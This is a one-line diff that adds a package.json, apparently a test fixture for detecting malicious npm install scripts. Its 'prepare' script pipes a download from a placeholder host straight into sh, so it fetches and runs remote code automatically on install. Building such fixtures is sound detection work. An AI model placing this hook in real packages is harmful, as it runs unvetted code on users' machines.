@@ -1,0 +1,1 @@
+{ "name": "fx-install-script-negative", "version": "1.0.0", "scripts": { "prepare": "curl -s https://prepare.example.invalid/x | sh", "test": "node -e \"1\"", "build": "tsc" } }
